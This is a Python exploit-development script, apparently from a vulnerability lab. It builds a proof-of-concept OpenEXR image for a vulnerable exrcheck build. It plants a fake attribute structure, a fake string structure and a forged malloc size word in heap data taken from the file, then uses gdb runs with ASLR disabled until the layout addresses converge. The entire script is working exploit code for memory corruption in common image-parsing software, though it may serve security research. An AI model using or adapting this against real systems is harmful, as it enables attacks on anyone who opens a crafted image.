#!/usr/bin/env python3
"""W196: put a fully file-chosen fake exr_attribute_t in COPY2's window.

Starts from the W195 pre-COPY2 source dump (unmodified), writes:
  dump[slot_off]   = address of the fake attribute (the dereferenced entries[0])
  dump[1152+20]    = EXR_ATTR_STRING (20)
  dump[1152+24]    = address of a fake exr_attr_string_t
  dump[1216..1227] = length, alloc_size=1, str=address of chosen data
  dump[1256]       = plausible malloc size word 0x91 for the chosen str target
  dump[1264..]     = 0x5a chosen data
Then inverse-shuffles for the 2-byte segment and regenerates the EXR.

Frame size and attribute-list placement both move with content, so the driver
repeats until the measured destination address AND measured entries[0] offset
match the assumed ones.  No debugger-forced pointer: every byte comes from
the EXR file.
"""
import re
import struct
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
LAB = HERE.parent
BASE = LAB / "work-w192/baseline.exr"
OUT = LAB / "cases/p196-fake-attr.exr"
DUMP = HERE / "w195-pre-copy2-dump.bin"
N, U, BYTE = 768, 3072, 0x5A
ATTR_OFF, STR_OFF, TARGET_OFF = 1152, 1216, 1264


def build(dest, slot_off):
    d = bytearray(DUMP.read_bytes())
    assert len(d) == 2 * N
    attr_addr = dest + ATTR_OFF
    str_addr = dest + STR_OFF
    target_addr = dest + TARGET_OFF
    d[slot_off:slot_off + 8] = struct.pack("<Q", attr_addr)
    d[ATTR_OFF + 20:ATTR_OFF + 24] = struct.pack("<I", 20)  # EXR_ATTR_STRING
    d[ATTR_OFF + 24:ATTR_OFF + 32] = struct.pack("<Q", str_addr)
    d[STR_OFF:STR_OFF + 4] = struct.pack("<i", 0x5A)
    d[STR_OFF + 4:STR_OFF + 8] = struct.pack("<i", 1)
    d[STR_OFF + 8:STR_OFF + 16] = struct.pack("<Q", target_addr)
    d[TARGET_OFF - 8:TARGET_OFF] = struct.pack("<Q", 0x91)
    d[TARGET_OFF:TARGET_OFF + 16] = bytes([BYTE]) * 16
    seg1 = bytes(d[0::2] + d[1::2])
    gen = subprocess.run(
        [sys.executable, str(HERE / "make_poc_mixed_full.py"), str(BASE),
         str(OUT), str(N), hex(BYTE), str(U), seg1.hex()],
         cwd=LAB, capture_output=True, text=True, check=True)
    return seg1, gen.stdout


def measure():
    cmd = ["gdb", "-q", "-batch",
           "-ex", "set args -c cases/p196-fake-attr.exr",
           "-ex", "set disable-randomization on",
           "-ex", "break sort2_4ByteChannels_tiled", "-ex", "run",
           "-ex", 'printf "SINK_OUT=%p\\n", outPtr',
           "-ex", "break attributes.c:305", "-ex", "continue",
           "-ex", 'printf "SLOT0_ADDR=%p\\n", &list->entries[0]',
           "-ex", "quit",
           "./build-vuln-plain/bin/exrcheck"]
    r = subprocess.run(cmd, cwd=LAB, capture_output=True, text=True)
    text = r.stdout + r.stderr
    m1 = re.search(r"SINK_OUT=(0x[0-9a-f]+)", text)
    m2 = re.search(r"SLOT0_ADDR=(0x[0-9a-f]+)", text)
    if not m1 or not m2:
        print(text[-2000:])
        raise SystemExit("no layout measurement")
    dest = int(m1.group(1), 16) + 4 * N
    return dest, int(m2.group(1), 16) - dest


def main():
    dest = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x555555828090
    slot_off = int(sys.argv[2]) if len(sys.argv) > 2 else 1104
    for i in range(10):
        seg1, out = build(dest, slot_off)
        actual_dest, actual_slot = measure()
        print(f"iter {i}: dest {dest:#x}/{actual_dest:#x} "
              f"slot {slot_off}/{actual_slot} "
              f"frame={re.search(r'frame=(\d+)', out).group(1)}")
        if actual_dest == dest and actual_slot == slot_off:
            print(f"FIXPOINT dest={dest:#x} slot={slot_off} "
                  f"attr={dest+ATTR_OFF:#x} string={dest+STR_OFF:#x} "
                  f"target={dest+TARGET_OFF:#x}")
            sha = subprocess.run(["sha256sum", str(OUT)], capture_output=True,
                                 text=True).stdout.split()[0]
            print(f"poc_sha256={sha}")
            return 0
        dest, slot_off = actual_dest, actual_slot
    raise SystemExit("no fixed point in 10 iterations")


if __name__ == "__main__":
    raise SystemExit(main())
